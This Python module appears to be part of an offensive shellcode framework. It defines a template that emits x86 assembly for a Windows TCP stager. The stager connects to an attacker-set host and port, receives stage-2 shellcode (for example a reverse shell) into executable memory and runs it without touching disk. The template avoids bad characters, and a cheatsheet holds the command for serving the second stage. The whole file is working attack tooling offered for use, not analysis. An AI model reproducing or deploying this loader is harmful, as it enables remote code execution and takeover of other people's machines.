"""TCP stager payload template — stage 1 of a multi-stage chain.

Downloads stage 2 shellcode from the attacker server into executable memory
and transfers control to it. Never touches disk.

Protocol (server speaks first):
  [4 bytes LE] stage2_size
  [stage2_size bytes] raw shellcode bytes

Stage 2 is a separate emitter build (e.g. reverse_shell or copy_then_run)
assembled to .bin and served immediately after the 4-byte length header.

Template sequence:
  WSAStartup -> WSASocketA -> connect -> recv(4) -> VirtualAlloc(RWX) ->
  recv loop -> closesocket -> call stage2

Required functions: LoadLibraryA, WSAStartup, WSASocketA, connect, recv,
                    closesocket, VirtualAlloc
Required variables: socket_handle, virt_buf, bytes_total, bytes_recvd
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig
from ..encode import encode_dword, encode_word, safe_push_word_as_dword


class TcpStagerTemplate(PayloadTemplate):
    REQUIRED_FUNCTIONS = (
        "LoadLibraryA",
        "WSAStartup",
        "WSASocketA",
        "connect",
        "recv",
        "closesocket",
        "VirtualAlloc",
    )
    REQUIRED_VARIABLES = (
        "socket_handle",
        "virt_buf",
        "bytes_total",
        "bytes_recvd",
    )

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)

        wsa_start = layout.slot("WSAStartup").ebp_ref
        wsa_sock  = layout.slot("WSASocketA").ebp_ref
        conn      = layout.slot("connect").ebp_ref
        recv_fn   = layout.slot("recv").ebp_ref
        closesk   = layout.slot("closesocket").ebp_ref
        valloc    = layout.slot("VirtualAlloc").ebp_ref

        sock_h      = layout.slot("socket_handle").ebp_ref
        virt_buf    = layout.slot("virt_buf").ebp_ref
        bytes_total = layout.slot("bytes_total").ebp_ref
        bytes_recvd = layout.slot("bytes_recvd").ebp_ref

        wsadata  = layout.slot("WSADATA").ebp_ref
        sockaddr = layout.slot("sockaddr_in").ebp_ref

        return "\n".join([
            "; ── TCP Stager (stage 1) ────────────────────────────────────────────",
            f"; Server: {config.lhost}:{config.lport}",
            "; Protocol: [uint32 LE size][raw stage-2 shellcode]",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            f"    lea  esi, {wsadata}",
            "    push esi",
            *safe_push_word_as_dword(0x0202, config.badchars),
            f"    call dword ptr {wsa_start}",
            "",
            "    ; WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0)",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax                    ; IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; AF_INET",
            f"    call dword ptr {wsa_sock}",
            f"    mov  {sock_h}, eax",
            "",
            "    ; sockaddr_in: sin_port and sin_addr",
            f"    lea  edi, {sockaddr}",
            "    xor  eax, eax",
            *encode_word(port_be, config.badchars, "ax"),
            "    mov  word ptr [edi+0x02], ax   ; sin_port (big-endian)",
            *encode_dword(ip_le, config.badchars, "eax"),
            "    mov  dword ptr [edi+0x04], eax ; sin_addr (network order)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            f"    lea  eax, {sockaddr}",
            "    push 0x10",
            "    push eax",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {conn}",
            "",
            "    ; recv(socket, &bytes_total, 4, 0) — read stage-2 size",
            "    xor  eax, eax",
            f"    lea  ecx, {bytes_total}",
            "    push eax",
            "    push 4",
            "    push ecx",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {recv_fn}",
            "",
            "    ; VirtualAlloc(NULL, bytes_total, MEM_COMMIT|MEM_RESERVE,",
            "    ;              PAGE_EXECUTE_READWRITE)",
            "    xor  eax, eax",
            "    mov  al, 0x40",
            "    push eax                    ; PAGE_EXECUTE_READWRITE = 0x40",
            "    mov  al, 0x30",
            "    shl  eax, 8                 ; MEM_COMMIT|MEM_RESERVE = 0x3000",
            "    push eax",
            f"    push dword ptr {bytes_total}",
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            f"    call dword ptr {valloc}",
            f"    mov  {virt_buf}, eax",
            "",
            "    ; initialise bytes_recvd = 0",
            "    xor  eax, eax",
            f"    mov  {bytes_recvd}, eax",
            "",
            "stage1_recv_loop:",
            f"    mov  eax, {virt_buf}",
            f"    add  eax, {bytes_recvd}",
            f"    mov  ecx, {bytes_total}",
            f"    sub  ecx, {bytes_recvd}",
            "    xor  ebx, ebx",
            "    push ebx                    ; flags = 0",
            "    push ecx                    ; len = remaining",
            "    push eax                    ; buf = virt_buf + bytes_recvd",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {recv_fn}",
            "    test eax, eax",
            "    jle  stage1_recv_done",
            f"    add  {bytes_recvd}, eax",
            f"    mov  eax, {bytes_recvd}",
            f"    cmp  eax, {bytes_total}",
            "    jl   stage1_recv_loop",
            "",
            "stage1_recv_done:",
            "    ; closesocket — stage 2 opens its own connection if needed",
            f"    push dword ptr {sock_h}",
            f"    call dword ptr {closesk}",
            "",
            "    ; transfer control to stage 2",
            f"    call dword ptr {virt_buf}",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Serve stage-2 shellcode",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} --file emitter_out/bin/shellcode.bin"),
            ("Protocol", "[4 bytes LE size][raw stage-2 shellcode bytes]"),
        ]
